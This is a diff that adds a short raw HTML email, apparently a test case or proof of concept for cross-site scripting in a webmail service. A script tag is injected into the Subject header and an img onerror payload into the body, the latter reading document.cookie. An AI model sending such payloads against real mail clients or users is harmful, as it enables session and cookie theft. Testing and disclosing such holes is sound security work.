@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: "/><script>alert(1)</script>
+To: victim@21cn.com
+MIME-Version: 1.0
+Content-type: text/html
+
+'/><img src='1' onerror='alert(document.cookie)'></img>
